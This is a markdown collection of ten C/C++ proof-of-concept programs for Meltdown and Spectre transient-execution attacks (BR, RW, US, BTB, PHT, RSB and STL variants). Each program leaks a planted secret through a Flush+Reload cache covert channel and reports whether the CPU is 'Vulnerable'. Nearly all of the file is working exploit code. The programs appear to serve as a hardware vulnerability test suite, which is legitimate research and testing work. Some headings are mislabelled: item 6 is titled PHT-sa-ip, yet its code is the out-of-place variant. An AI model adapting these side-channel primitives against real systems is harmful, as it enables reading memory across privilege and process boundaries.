# Valid PoCs
1. Meltdown-BR
```c
/*
    To-do: Try to change mem2 to mem
*/

#define _GNU_SOURCE
#include <memory.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <signal.h>

char mem2[4096 * 256];

#define DOG_STR "abcx"
#define PWD_STR "yyyy"
#define DOG_LEN strlen(DOG_STR)
#define PWD_LEN strlen(PWD_STR)

#define FR_START 'a'
#define FR_END 'z'

#include "libcache/cache.h"
#include "lib/global.h"

// Define the bounds for the dog
struct
{
    uint32_t low;
    uint32_t high;
} my_dog_bounds = {
    .low = 0,
    .high = DOG_LEN};

char *buffer;
int idx = 0, fault = 0, fault_recovered = 0;

void fault_handler(int no)
{
    int i;
    fault_recovered = 0;
    // Recover the data from the covert channel
    for (i = FR_START; i < FR_END; i++)
    {
        if (flush_reload(mem2 + i * 4096))
        {
            fault_recovered = i;
            break;
        }
    }
    // printf("PF %d: dog[%d] = '%c' (recovered '%c')\n",
    //        fault++, idx, buffer[idx], fault_recovered ? i : 'x');

/* resolve faulting BOUND to retry */
#if __MPX__
    exit(0);
#else
    my_dog_bounds.high += PWD_LEN;
#endif
}

int __attribute__((aligned(0x1000))) dummy;

int main(int argc, char **argv)
{
    if (argc != 3)
    {
        printf("Usage\t: ./poc [pagesize] [threshold]\nExample\t: ./poc 4096 200\n");
        exit(-1);
    }
    sscanf(argv[1], "%d", &pagesize);
    sscanf(argv[2], "%d", &CACHE_MISS);
    int passed_count = 0;
    printf("Meltdown_BR Begins!\n");
    int status, i;
    char c = 'X';
    // Install signal handler
    signal(SIGSEGV, fault_handler);
    memset(mem2, 1, sizeof(mem2));

    // Detect cache threshold
    if (!CACHE_MISS)
        CACHE_MISS = 210;
    // printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);

    buffer = mmap(NULL, getpagesize(), PROT_READ | PROT_WRITE,
                  MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);

    strcpy(buffer, DOG_STR PWD_STR);

    // Flush our shared memory
    for (i = 0; i < 256; i++)
    {
        flush(mem2 + i * 4096);
    }

    for (idx = DOG_LEN; idx < DOG_LEN + PWD_LEN; idx++)
    {
        // Ensure data is in the cache
        maccess(buffer);
        unsigned status;

// Define the bounds for the dog
#if __MPX__
        void *p = __bnd_set_ptr_bounds(buffer, DOG_LEN);
#else
        my_dog_bounds.high = DOG_LEN;
#endif

// tsx begin
#if USE_TSX
        asm volatile(".byte 0xc7,0xf8,0x00,0x00,0x00,0x00"
                     : "=a"(status)
                     : "a"(-1UL)
                     : "memory");
        if (status == (~0u))
        {
#endif
            /* high-latency access to prolong transient execution beyond fault */
            maccess(&dummy);

/* explicit check to allow LFENCE insertion */
#if __MPX__
            __bnd_chk_ptr_bounds(p, idx + 1);
#else
        asm("bound %0, (my_dog_bounds)\n\t"
            :
            : "r"(idx + 1)
            :);
#endif

#if LFENCE
            nospec();
#endif

            // Illegal access to data
            c = buffer[idx];
            // Encode data in the cache
            maccess(mem2 + c * 4096);

// tsx end
#if USE_TSX
            asm volatile(".byte 0x0f; .byte 0x01; .byte 0xd5" ::
                             : "memory");
        }
        else
        {
            c = 'X';
            fault_recovered = 1;
        }
#endif

        // Recover data from the cache
        for (i = FR_START; i < FR_END; i++)
        {
            if (flush_reload(mem2 + i * 4096))
            {
                break;
            }
        }
        flush(&dummy);

        if ((idx >= DOG_LEN) && !fault_recovered)
            idx--;
        else if (c == i)
        {
            passed_count++;
        }
    }
    int exit_result = 0;
    if (passed_count == 4)
    {
        printf(ANSI_COLOR_RED "Meltdown_BR: Vulnerable\n" ANSI_COLOR_RESET);
        exit_result = EXIT_SUCCESS;
    }
    else
    {
        printf(ANSI_COLOR_GREEN "Meltdown_BR: Not Vulnerable\n" ANSI_COLOR_RESET);
        exit_result = EXIT_FAILURE;
    }
    printf("Meltdown_BR Done!\n\n");
    exit(exit_result);
}

```

2. Meltdown-RW
```c
#define _GNU_SOURCE
#include <memory.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <sys/prctl.h>

#include "libcache/cache.h"
#include "lib/global.h"

void readonly_area()
{
    asm volatile(".byte 'R','R','R','R','R','R','R','R','R','R','R','R','R','R','R','R'\n");
    asm volatile(".byte 'R','R','R','R','R','R','R','R','R','R','R','R','R','R','R','R'\n");
    asm volatile(".byte 'R','R','R','R','R','R','R','R','R','R','R','R','R','R','R','R'\n");
    asm volatile(".byte 'R','R','R','R','R','R','R','R','R','R','R','R','R','R','R','R'\n");
}

int main(int argc, char **argv)
{
    PREPARE();
    printf("Meltdown_RW Begins...\n");
    // Flush our shared memory
    flush_shared_memory();

    for (int i = 0; i < MAX_TRY_TIMES; i++)
    {
        if (try_start())
        {
            //Null pointer access prolongs transient window
            maccess(0);
            //overwrite read-only data
            (*((volatile char *)((size_t)readonly_area + 32))) = 'S';
            //access shared memory based on overwritten value
            maccess(mem + *((volatile char *)((size_t)readonly_area + 32)) * pagesize);

            try_abort();
        }
        try_end();

        //Recover data from cache covert channel
        if (cache_decode() == 'S')
        {
            passed_count++;
        }
    }
    // printf("%lf\n", (double)passed_count/MAX_TRY_TIMES);
    int exit_result = 0;
    if ((double)passed_count / MAX_TRY_TIMES > 0.3)
    {
        printf(ANSI_COLOR_RED "Meltdown_RW: Vulnerable\n" ANSI_COLOR_RESET);
        exit_result = EXIT_SUCCESS;
    }
    else
    {
        printf(ANSI_COLOR_GREEN "Meltdown_RW: Not Vulnerable\n" ANSI_COLOR_RESET);
        exit_result = EXIT_FAILURE;
    }
    printf("Meltdown_RW Done!\n\n");
    exit(exit_result);
}
```

3. Meltdown-US
```c
#define _GNU_SOURCE
#include <memory.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>

#include "libpte/ptedit_header.h"
#include "libcache/cache.h"
#include "lib/global.h"

char *victim_page;

#define SECRET 'S'

int main(int argc, char **argv)
{
    // 准备阶段
    PREPARE();

    printf("Meltdown_US Begins...\n");

    // Initialize PTEditor to manipulate page table entries
    if (ptedit_init())
    {
        printf(ANSI_COLOR_GREEN "Meltdown_US: Not Vulnerable\n" ANSI_COLOR_RESET);
        printf("Meltdown_US done!\n\n");
        exit(-1);
    }

    // We need a shared mapping. One mapping gets US bit cleared for unauthorized access.
    // The second one remains valid to keep data in the cache as it works better.
    int shm = shm_open("shared_mapping", O_CREAT | O_RDWR, 0644);
    if (shm == -1)
    {
        printf(ANSI_COLOR_GREEN "Meltdown_US: Not Vulnerable\n" ANSI_COLOR_RESET);
        printf("Meltdown_US done!\n\n");
        exit(-1);
    }

    // Set memory objects size
    if (ftruncate(shm, 4096 * 2) == -1)
    {
        printf(ANSI_COLOR_GREEN "Meltdown_US: Not Vulnerable\n" ANSI_COLOR_RESET);
        printf("Meltdown_US done!\n\n");
        exit(-1);
    }

    // Victim mapping that gets US bit cleared
    victim_page = (char *)mmap(NULL, pagesize, PROT_READ | PROT_WRITE,
                               MAP_SHARED, shm, 0);

    // Mapping for keeping data in the cache
    char *accessor = (char *)mmap(NULL, pagesize, PROT_READ | PROT_WRITE,
                                  MAP_SHARED, shm, 0);

    // Write data we want to recover to our victim page
    memset(victim_page, SECRET, pagesize * sizeof(char));
    // Clear US bit of our victim page
    ptedit_pte_clear_bit(victim_page, 0, PTEDIT_PAGE_BIT_USER);

    // Flush our shared memory
    flush_shared_memory();
    
    for (int r = 0; r < MAX_TRY_TIMES; r++)
    {
        // Load data into the cache and fence
        maccess(accessor);
        mfence();
        // Start TSX transaction if available on CPU
        if (try_start())
        {
            // Null pointer access prolongs transient window
            maccess(0);
            // Perform access based on unauthorized data
            maccess(mem + *victim_page * pagesize);
            try_abort();
        }
        try_end();

        // Recover data from cache covert channel
        if (cache_decode() == 'S')
        {
            passed_count++;
        }
    }
    int exit_result = 0;
    if ((double)passed_count / MAX_TRY_TIMES > 0.3)
    {
        // printf("Success rate: %lf\n", (double)passed_count / MAX_TRY_TIMES);
        printf(ANSI_COLOR_RED "Meltdown_US: Vulnerable\n" ANSI_COLOR_RESET);
        exit_result = EXIT_SUCCESS;
    }
    else
    {
        printf(ANSI_COLOR_GREEN "Meltdown_US: Not Vulnerable\n" ANSI_COLOR_RESET);
        exit_result = EXIT_FAILURE;
    }
    munmap(victim_page, pagesize);
    munmap(accessor, pagesize);
    shm_unlink("shared_mapping");
    ptedit_cleanup();
    printf("Meltdown_US Done!\n\n");
    exit(exit_result);
}

```

4. Spectre-BTB-sa-ip
```c
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sched.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>

extern "C"
{
#include "libcache/cache.h"
#include "lib/global.h"
}

#define SECRET 'S'

// Base class
class Animal
{
public:
    virtual void move()
    {
    }
};

// Bird contains the secret
class Bird : public Animal
{
private:
    char secret;

public:
    Bird()
    {
        secret = SECRET;
    }
    void move()
    {
        // nop
    }
};

// Class that contains the function to leak data
class Fish : public Animal
{
private:
    char data;

public:
    Fish()
    {
        data = 'F';
    }
    void move()
    {
        // Encode data in the cache
        cache_encode(data);
    }
};

// Function so that we always call animal->move from the same virtual address
// required for indexing always the same BTB entry
void move_animal(Animal *animal)
{
    animal->move();
}

int main(int argc, char **argv)
{
    PREPARE();
    printf("Spectre_BTB_sa_ip Begins...\n");
    Fish *fish = new Fish();
    Bird *bird = new Bird(); // contains secret

    char *ptr = (char *)((((size_t)move_animal)) & ~(pagesize - 1));
    mprotect(ptr, pagesize * 2, PROT_READ | PROT_WRITE | PROT_EXEC);
    
    maccess((void *)move_animal);

    ptr[0] = ptr[0];

    for (int i = 0; i < MAX_TRY_TIMES; i++)
    {
        nospec();
        // Mistrain the BTB for Fish
        for (int j = 0; j < 1000; j++)
        {
            move_animal(fish);
        }
        // Flush our shared memory
        flush_shared_memory();
        mfence();

        // Increase misspeculation chance
        flush(bird);
        mfence();

        nospec();
        // Leak bird secret
        move_animal(bird);

        // Recover data from the covert channel
        if (cache_decode() == 'S')
        {
            passed_count++;
        }
    }
    int exit_result = 0;
    if (passed_count > 0)
    {
        // printf("%d", passed_count);
        printf(ANSI_COLOR_RED "Spectre_BTB_sa_ip: Vulnerable\n" ANSI_COLOR_RESET);
        exit_result = EXIT_SUCCESS;
    }
    else
    {
        printf(ANSI_COLOR_GREEN "Spectre_BTB_sa_ip: Not Vulnerable\n" ANSI_COLOR_RESET);
        exit_result = EXIT_FAILURE;
    }
    printf("Spectre_BTB_sa_ip Done!\n\n");
    exit(exit_result);
}

```

5. Spectre-PHT-sa-ip
```c
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "libcache/cache.h"
#include "lib/global.h"

// accessible data
#define DATA "data|"
// inaccessible secret (following accessible data)
#define SECRET "INACCESSIBLE SECRET"

#define DATA_SECRET DATA SECRET

unsigned char data[128];

char access_array(int x)
{
    // flushing the data which is used in the condition increases
    // probability of speculation
    size_t len = sizeof(DATA) - 1;
    mfence();
    flush(&len);
    flush(&x);

    // ensure data is flushed at this point
    mfence();

    // check that only accessible part (DATA) can be accessed
    if ((float)x / (float)len < 1)
    {
        // countermeasure: add the fence here
        // Encode in cache
        cache_encode(data[x]);
    }
}

int main(int argc, const char **argv)
{
    PREPARE();
    printf("Spectre_PHT_sa_ip Begins...\n");

    // store secret
    memset(data, ' ', sizeof(data));
    memcpy(data, DATA_SECRET, sizeof(DATA_SECRET));
    // ensure data terminates
    data[sizeof(data) / sizeof(data[0]) - 1] = '0';

    // flush our shared memory
    flush_shared_memory();

    // nothing leaked so far
    char leaked[sizeof(DATA_SECRET) + 1];
    memset(leaked, ' ', sizeof(leaked));
    leaked[sizeof(DATA_SECRET)] = 0;

    int j = 0;
    for (int i = 0; i < MAX_TRY_TIMES; i++)
    {
        // for every byte in the string
        j = (j + 1) % sizeof(DATA_SECRET);

        // mistrain with valid index
        for (int y = 0; y < 10; y++)
        {
            access_array(0);
        }
        // potential out-of-bounds access
        access_array(j);
        
        mfence(); // avoid speculation
        // Recover data from covert channel
        cache_decode_array(leaked, j);
    }
    for (int i = 0; i < sizeof(SECRET) - 1; i++)
    {
        if (SECRET[i] == leaked[i + sizeof(DATA) - 1])
        {
            passed_count++;
        }
    }
    int exit_result = 0;
    if (passed_count > 0)
    {
        printf(ANSI_COLOR_RED "Spectre_PHT_sa_ip: Vulnerable\n" ANSI_COLOR_RESET);
        exit_result = EXIT_SUCCESS;
    }
    else
    {
        printf(ANSI_COLOR_GREEN "Spectre_PHT_sa_ip: Not Vulnerable\n" ANSI_COLOR_RESET);
        exit_result = EXIT_FAILURE;
    }
    printf("Spectre_PHT_sa_ip Done!\n\n");
    exit(exit_result);
}

```

6. Spectre-PHT-sa-ip
```c
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "libcache/cache.h"
#include "lib/global.h"

// accessible data
#define DATA "data|"
// inaccessible secret (following accessible data)
#define SECRET "SECRETSS"

#define likely(x) __builtin_expect((x), 1)
#define unlikely(x) __builtin_expect((x), 0)

#define DATA_SECRET DATA SECRET

unsigned char data[128];

char access_array(int x)
{
    // flushing the data which is used in the condition increases
    // probability of speculation
    size_t len = sizeof(DATA) - 1;
    mfence();
    flush(&len);
    flush(&x);

    // ensure data is flushed at this point
    mfence();

    // check that only accessible part (DATA) can be accessed
    if (unlikely((float)x / (float)len < 1))
    {
        // countermeasure: add the fence here
        // Encode data in cache
        cache_encode(data[x]);
    }
}

volatile int true = 1;

// Span large part of memory with jump if equal
#if defined(__i386__) || defined(__x86_64__)
#define JE asm volatile("je end");
#elif defined(__aarch64__)
#define JE asm volatile("beq end");
#endif
#define JE_16 JE JE JE JE JE JE JE JE JE JE JE JE JE JE JE JE
#define JE_256 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16
#define JE_4K JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256
#define JE_64K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K

void oop()
{
#if defined(__i386__) || defined(__x86_64__)
    if (!true)
        true ++;
#elif defined(__aarch64__)
    if (true)
        true ++;
#endif
    JE_64K

end:
    return;
}

int main(int argc, const char **argv)
{
    PREPARE();
    printf("Spectre_PHT_sa_oop Begins...\n");

    // store secret
    memset(data, ' ', sizeof(data));
    memcpy(data, DATA_SECRET, sizeof(DATA_SECRET));
    // ensure data terminates
    data[sizeof(data) / sizeof(data[0]) - 1] = '0';

    // flush everything
    flush_shared_memory();

    // nothing leaked so far
    char leaked[sizeof(DATA_SECRET) + 1];
    memset(leaked, ' ', sizeof(leaked));
    leaked[sizeof(DATA_SECRET)] = 0;

    int j = 0;
    for (int i = 0; i < MAX_TRY_TIMES; i++)
    {
        // for every byte in the string
        j = (j + 1) % sizeof(DATA_SECRET);

        // mistrain out of place
        for (int y = 0; y < 100; y++)
        {
            oop();
        }

        mfence(); // avoid speculation
        // out of bounds access
        access_array(j);
        // Recover data from covert channel
        cache_decode_array(leaked, j);
    }
    for (int i = 0; i < sizeof(SECRET) - 1; i++)
    {
        if (SECRET[i] == leaked[i + sizeof(DATA) - 1])
        {
            passed_count++;
        }
    }
    // puts(leaked);
    int exit_result = 0;
    if (passed_count > 0)
    {
        printf(ANSI_COLOR_RED "Spectre_PHT_sa_oop: Vulnerable\n" ANSI_COLOR_RESET);
        exit_result = EXIT_SUCCESS;
    }
    else
    {
        printf(ANSI_COLOR_GREEN "Spectre_PHT_sa_oop: Not Vulnerable\n" ANSI_COLOR_RESET);
        exit_result = EXIT_FAILURE;
    }
    printf("Spectre_PHT_sa_oop Done!\n\n");
    exit(exit_result);
}

```

7. Spectre-PHT-ca-ip
```c
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "libcache/cache.h"
#include "lib/global.h"

// accessible data
#define DATA "data|"
// inaccessible secret (following accessible data)
#define SECRET "SECRETSS"

#define DATA_SECRET DATA SECRET

unsigned char data[128];

char access_array(int x)
{
    // flushing the data which is used in the condition increases
    // probability of speculation
    size_t len = sizeof(DATA) - 1;
    mfence();
    flush(&len);
    flush(&x);

    // ensure data is flushed at this point
    mfence();

    // check that only accessible part (DATA) can be accessed
    if ((float)x / (float)len < 1)
    {
        // countermeasure: add the fence here
        cache_encode(data[x]);
    }
}

int main(int argc, const char **argv)
{
    PREPARE();
    printf("Spectre_PHT_ca_ip Begins...\n");

    pid_t pid = fork();
    // initialize memory
    memset(mem, pid, pagesize * 256);

    // store secret
    memset(data, ' ', sizeof(data));
    memcpy(data, DATA_SECRET, sizeof(DATA_SECRET));
    // ensure data terminates
    data[sizeof(data) / sizeof(data[0]) - 1] = '0';

    // flush our shared memory
    flush_shared_memory();

    // nothing leaked so far
    char leaked[sizeof(DATA_SECRET) + 1];
    memset(leaked, ' ', sizeof(leaked));
    leaked[sizeof(DATA_SECRET)] = 0;

    int j = 0;
    for (int i = 0; i < MAX_TRY_TIMES; i++)
    {
        // for every byte in the string
        j = (j + 1) % sizeof(DATA_SECRET);

        // mistrain with valid index
        if (pid == 0)
        {
            for (int y = 0; y < 10; y++)
            {
                access_array(0);
            }
        }
        else
        {
            // potential out-of-bounds access
            access_array(j);

            mfence(); // avoid speculation
            cache_decode_array(leaked, j);
        }
    }
    int exit_result = 0;
    if (pid != 0)
    {
        for (int i = 0; i < sizeof(SECRET) - 1; i++)
        {
            if (SECRET[i] == leaked[i + sizeof(DATA) - 1])
            {
                passed_count++;
            }
        }
        if (passed_count > 0)
        {
            printf(ANSI_COLOR_RED "Spectre_PHT_ca_ip: Vulnerable\n" ANSI_COLOR_RESET);
            exit_result = EXIT_SUCCESS;
        }
        else
        {
            printf(ANSI_COLOR_GREEN "Spectre_PHT_ca_ip: Not Vulnerable\n" ANSI_COLOR_RESET);
            exit_result = EXIT_FAILURE;
        }
        printf("Spectre_PHT_ca_ip Done!\n\n");
    }
    else
    {
        exit(1);
    }
}
```

8. Spectre-PHT-ca-oop
```c
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "libcache/cache.h"
#include "lib/global.h"

// accessible data
#define DATA "data|"
// inaccessible secret (following accessible data)
#define SECRET "SECRETSS"

#define likely(x) __builtin_expect((x), 1)
#define unlikely(x) __builtin_expect((x), 0)

#define DATA_SECRET DATA SECRET

unsigned char data[128];

char access_array(int x)
{
    // flushing the data which is used in the condition increases
    // probability of speculation
    size_t len = sizeof(DATA) - 1;
    mfence();
    flush(&len);
    flush(&x);

    // ensure data is flushed at this point
    mfence();

    // check that only accessible part (DATA) can be accessed
    if (unlikely((float)x / (float)len < 1))
    {
        // countermeasure: add the fence here
        cache_encode(data[x]);
    }
}

volatile int true = 1;

// Span a large part of memory with jumps if equal
#if defined(__i386__) || defined(__x86_64__)
#define JE asm volatile("je end");
#else
#define JE asm volatile("beq end");
#endif
#define JE_16 JE JE JE JE JE JE JE JE JE JE JE JE JE JE JE JE
#define JE_256 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16
#define JE_4K JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256
#define JE_64K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K

void oop()
{
    if (!true)
        true ++;
    JE_64K

end:
    return;
}

int main(int argc, const char **argv)
{
    PREPARE();
    printf("Spectre_PHT_ca_oop Begins...\n");
    
    pid_t pid = fork();

    // store secret
    memset(data, ' ', sizeof(data));
    memcpy(data, DATA_SECRET, sizeof(DATA_SECRET));
    // ensure data terminates
    data[sizeof(data) / sizeof(data[0]) - 1] = '0';

    // flush our shared memory
    flush_shared_memory();

    // nothing leaked so far
    char leaked[sizeof(DATA_SECRET) + 1];
    memset(leaked, ' ', sizeof(leaked));
    leaked[sizeof(DATA_SECRET)] = 0;

    int j = 0;
    for (int i = 0; i < MAX_TRY_TIMES; i++)
    {
        // for every byte in the string
        j = (j + 1) % sizeof(DATA_SECRET);

        // mistrain out of place
        if (pid == 0)
        {
            for (int y = 0; y < 100; y++)
            {
                oop();
            }
        }
        else
        {
            mfence(); // avoid speculation
                        // out of bounds access
            access_array(j);
            // Recover data from covert channel
            cache_decode_array(leaked, j);
        }
    }
    if (pid != 0)
    {
        for (int i = 0; i < sizeof(SECRET) - 1; i++)
        {
            if (SECRET[i] == leaked[i + sizeof(DATA) - 1])
            {
                passed_count++;
            }
        }
        int exit_result = 0;
        if (passed_count > 0)
        {
            printf(ANSI_COLOR_RED "Spectre_PHT_ca_oop: Vulnerable\n" ANSI_COLOR_RESET);
            exit_result = EXIT_SUCCESS;
        }
        else
        {
            printf(ANSI_COLOR_GREEN "Spectre_PHT_ca_oop: Not Vulnerable\n" ANSI_COLOR_RESET);
            exit_result = EXIT_FAILURE;
        }
        printf("Spectre_PHT_ca_oop Done!\n\n");
        exit(exit_result);
    }
    else
    {
        exit(1);
    }
}

```

9. Spectre-RSB-sa-oop
```c
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "libcache/cache.h"
#include "lib/global.h"

// inaccessible secret
#define SECRET "SECRETSS"

int idx;

// Pop return address from the software stack, causing misspeculation when hitting the return
int __attribute__((noinline)) call_manipulate_stack()
{
    if (try_start())
    {
#if defined(__i386__) || defined(__x86_64__)
        asm volatile("pop %%rax\n"
                     :
                     :
                     : "rax");
#elif defined(__aarch64__)
        asm volatile("ldp x29, x30, [sp],#16\n"
                     :
                     :
                     : "x29");
#endif
        try_abort();
    }
    try_end();
    return 0;
}

int __attribute__((noinline)) call_leak()
{
    // Manipulate the stack so that we don't return here, but to call_start
    call_manipulate_stack();
    // architecturally, this is never executed
    // Encode data in covert channel
    cache_encode(SECRET[idx]);
    return 2;
}

int __attribute__((noinline)) call_start()
{
    call_leak();
    return 1;
}

void confuse_compiler()
{
    // this function -- although never called -- is required
    // otherwise, the compiler replaces the calls with jumps
    call_start();
    call_leak();
    call_manipulate_stack();
}

int main(int argc, char **argv)
{

    PREPARE();
    printf("Spectre_RSB_sa_oop Begins...\n");

    // flush our shared memory
    flush_shared_memory();
    // nothing leaked so far
    char leaked[sizeof(SECRET) + 1];
    memset(leaked, ' ', sizeof(leaked));
    leaked[sizeof(SECRET)] = 0;

    idx = 0;
    for (int i = 0; i < MAX_TRY_TIMES; i++)
    {
        // for every byte in the string
        idx = (idx + 1) % sizeof(SECRET);

        call_start();

        // Recover data from covert channel
        cache_decode_array(leaked, idx);
    }
    for (int i = 0; i < sizeof(SECRET) - 1; i++)
    {
        if (SECRET[i] == leaked[i])
        {
            passed_count++;
        }
    }
    // puts(leaked);
    int exit_result = 0;
    if (passed_count > 0)
    {
        printf(ANSI_COLOR_RED "Spectre_RSB_sa_oop: Vulnerable\n" ANSI_COLOR_RESET);
        exit_result = EXIT_SUCCESS;
    }
    else
    {
        printf(ANSI_COLOR_GREEN "Spectre_RSB_sa_oop: Not Vulnerable\n" ANSI_COLOR_RESET);
        exit_result = EXIT_FAILURE;
    }
    printf("Spectre_RSB_sa_oop done!\n\n");
    exit(exit_result);
}

```

10. Spectre-STL
```c
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <seccomp.h>
#include <linux/seccomp.h>

#include "libcache/cache.h"
#include "lib/global.h"

// inaccessible (overwritten) secret
#define SECRET "SECRETSS"
#define OVERWRITE '#'

char *data;

char access_array(int x)
{
    // store secret in data
    strcpy(data, SECRET);

    // flushing the data which is used in the condition increases
    // probability of speculation
    mfence();
    char **data_slowptr = &data;
    char ***data_slowslowptr = &data_slowptr;
    mfence();
    flush(&x);
    flush(data_slowptr);
    flush(&data_slowptr);
    flush(data_slowslowptr);
    flush(&data_slowslowptr);
    // ensure data is flushed at this point
    mfence();

    // overwrite data via different pointer
    // pointer chasing makes this extremely slow
    (*(*data_slowslowptr))[x] = OVERWRITE;

    // data[x] should now be "#"
    // uncomment next line to break attack
    //mfence();
    // Encode stale value in the cache
    cache_encode(data[x]);
}

int main(int argc, char **argv)
{
    PREPARE();

    printf("Spectre_STL Begins...\n");

    data = malloc(128);
    // store secret
    strcpy(data, SECRET);

    // Flush our shared memory
    flush_shared_memory();

    // nothing leaked so far
    char leaked[sizeof(SECRET) + 1];
    memset(leaked, ' ', sizeof(leaked));
    leaked[sizeof(SECRET)] = 0;

    int j = 0;
    for (int i = 0; i < MAX_TRY_TIMES; i++)
    {
        // for every byte in the string
        j = (j + 1) % sizeof(SECRET);

        // overwrite value with X, then access
        access_array(j);

        mfence(); // avoid speculation
        // Recover data from covert channel
        cache_decode_array(leaked, j);
    }
    for (int i = 0; i < sizeof(SECRET) - 1; i++)
    {
        if (SECRET[i] == leaked[i])
        {
            passed_count++;
        }
    }
    // puts(leaked);
    int exit_result = 0;
    if (passed_count > 0)
    {
        printf(ANSI_COLOR_RED "Spectre_STL: Vulnerable\n" ANSI_COLOR_RESET);
        exit_result = EXIT_SUCCESS;
    }
    else
    {
        printf(ANSI_COLOR_GREEN "Spectre_STL: Not Vulnerable\n" ANSI_COLOR_RESET);
        exit_result = EXIT_FAILURE;
    }
    printf("Spectre_STL done!\n\n");
    exit(exit_result);
}

```

